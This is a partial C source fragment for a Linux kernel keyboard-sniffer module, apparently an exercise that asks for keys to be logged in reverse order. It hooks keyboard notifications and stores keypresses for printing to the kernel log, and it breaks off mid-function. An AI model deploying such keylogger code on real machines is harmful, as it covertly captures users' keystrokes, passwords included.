/*
	Write a keyboard logger device driver which prints or logs keys in REVERSE order.
	Example - if keys pressed are "BAMOZ" then the output is "ZOMAB"
*/
/* A keyboard Sniffer module */
...
#define DRIVER_AUTHOR "Arun Narasimhan"
#define DRIVER_DESC   "Keyboard Sniffer Module"
...
char* keyStack [MaxLenRec];
int j = MaxLenRec;

void stackPrint (void)
{
	int i;
	for (i = j; i < MaxLenRec; i++)
	{
		printk (KERN_INFO "%s ", keyStack [i]);
	}
	printk (KERN_INFO "-*-*-*-*-*-*-*-*-*-*-*-*-*-*-");
}
...
int keylogger_notify (struct notifier_block *nblock, unsigned long code, void *_param)
{
	...
	if  (code == KBD_KEYCODE)
	{
		...
		if (param->down)
		{
			...
			{
				keyStack [--j] = keymapShiftActivated [param->value];
				if (!j)
				{
					stackPrint ();
					j = MaxLenRec;
